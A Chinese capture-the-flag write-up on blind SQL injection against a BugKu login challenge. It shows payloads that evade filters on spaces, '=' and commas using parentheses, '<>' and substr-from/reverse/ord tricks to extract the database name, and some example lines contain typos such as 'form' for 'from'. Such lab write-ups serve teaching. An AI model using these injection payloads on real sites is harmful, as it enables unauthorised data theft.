### substr()+reverse()+ord() 绕过逗号过滤

话不多说，直接上题（BugKu CTF）

![](https://pic1.imgdb.cn/item/682ae2ae58cb8da5c8fbde5e.jpg)

尝试弱口令回显密码错误

![](https://pic1.imgdb.cn/item/682ae7e958cb8da5c8fbe1f0.jpg)

用户名是 admin，万能密码回显非法字符

![](https://pic1.imgdb.cn/item/682ae80458cb8da5c8fbe1f6.jpg)

fuzz 测试一波看看过滤了哪些

![](https://pic1.imgdb.cn/item/682ae81858cb8da5c8fbe1fc.jpg)

过滤了空格，可以使用 () 绕过

同时过滤了 =，但是我们可以用 <> 替换 !=

他俩都表示不等于，于是可以构造语句，先永假条件测试返回用户名不存在

```sql
hjakshdksjah'or(1<>1)#
```

![](https://pic1.imgdb.cn/item/682ae86658cb8da5c8fbe245.jpg)

再永真条件测试返回密码不存在

```sql
hjakshdksjah'or(1<>2)#
```

![](https://pic1.imgdb.cn/item/682ae94e58cb8da5c8fbe5a9.jpg)

首先是咱输入的用户名肯定是不存在的（键盘瞎按的）

如果 or 语句为假则用户名不存在，反之为真，由此可以先测试数据库长度

最后得到数据库长度为 8

```sql
hjakshdksjah'or(length(database()>0))#
```

![](https://pic1.imgdb.cn/item/682aea6e58cb8da5c8fbe897.jpg)

接下来需要爆破数据库名，但是它过滤了逗号

想到了字符串截取函数 `substr()` 不要逗号空格的用法

```sql
# from 后面的数字表示它从第几位开始取字符
substr('flag' from 1)		# 返回：flag
substr('flag' from 2)		# 返回：lag
```

可以构造下面 payload 拿到数据库名

```sql
substr((database())from(1))
```

但是 for 有截取长度限制，所以我们再套一个 `substr() + reverse()` 每次只截取一位

```sql
substr((reverse(substr('flag' form 1))) from 4 )		# 返回：f
substr((reverse(substr('flag' form 2))) from 3 )		# 返回：l
substr((reverse(substr('flag' form 3))) from 2 )		# 返回：a
substr((reverse(substr('flag' form 4))) from 1 )		# 返回：g
```

最后再利用之前 <> 配合 `ord()` 转 ASCII 码比较

```sql
asdadadadadas'or(ord(substr(reverse(substr((database())from(1)))from(8)))<>115)#
```

![](https://pic1.imgdb.cn/item/682af24b58cb8da5c8fc19be.jpg)